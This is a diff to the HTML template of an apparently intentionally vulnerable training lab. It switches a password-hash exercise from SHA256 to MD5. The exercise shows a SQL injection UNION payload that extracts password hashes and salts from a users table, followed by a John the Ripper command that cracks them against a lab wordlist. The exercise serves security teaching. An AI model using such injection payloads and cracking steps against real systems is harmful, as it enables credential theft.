@@ -19,14 +19,14 @@
     <h2>Password Hash Exercise</h2>
     <p>
         In unsafe mode, retrieve password hashes in John the Ripper's dynamic
-        format for SHA256(salt + password):
+        format for MD5(salt + password):
     </p>
-    <pre>' UNION SELECT id, '$dynamic_61$' || password_hash || '$' || salt FROM users-- </pre>
+    <pre>' UNION SELECT id, '$dynamic_4$' || password_hash || '$' || salt FROM users-- </pre>
     <p>
         Save each returned value from Column 2 on its own line in
         <code>hashes-john.txt</code>, then run John with the included lab wordlist:
     </p>
-    <pre>john --format=dynamic_61 --wordlist=pentest/password_wordlist4john.txt hashes-john.txt</pre>
+    <pre>john --format=dynamic_4 --wordlist=pentest/password_wordlist4john.txt hashes-john.txt</pre>
     <p>The seeded user's password is included in that wordlist.</p>
 
     {% if query %}
